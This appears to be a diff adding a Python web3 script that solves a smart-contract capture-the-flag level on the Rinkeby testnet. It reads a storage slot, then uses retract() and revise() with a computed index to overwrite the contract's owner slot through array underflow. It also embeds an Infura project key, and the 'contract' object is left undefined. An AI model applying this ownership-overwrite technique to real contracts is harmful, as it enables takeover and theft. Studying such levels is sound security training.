@@ -1,0 +1,13 @@
+from web3 import Web3
+
+w3 = Web3(
+    Web3.HTTPProvider("https://rinkeby.infura.io/v3/83497ae5682b40678d5e9a61a26701aa")
+)
+
+storage = w3.eth.get_storage_at("0x862898ceF31c8503A41Cb030644Db60F1908b4a2", 0).hex()
+
+contract.retract()
+contract.revise(
+    "35707666377435648211887908874984608119992236509074197713628505308453184860938",
+    "0x000000000000000000000000C5fb2eF9582Ec5bCCF5BB8f7F6EbD6c94843f10f",
+)
